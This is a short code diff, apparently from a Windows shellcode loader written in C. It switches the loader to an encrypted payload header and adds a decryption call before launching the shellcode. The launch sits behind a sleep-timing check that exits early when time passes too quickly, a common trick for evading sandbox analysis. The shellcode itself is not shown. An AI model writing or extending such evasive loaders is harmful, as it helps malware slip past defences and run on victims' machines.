@@ -1,6 +1,6 @@
 #include <time.h>
 #include <windows.h>
-#include "..\payload\payload.h"
+#include "..\payload_encrypted\payload.h"
 
 #define SLEEP_TIME 5000
 
@@ -19,6 +19,7 @@ int main() {
     if (time_between < SLEEP_TIME){
         return 0;
     }else{
+        decryptShellCode();
         startShellCode();
     }
 
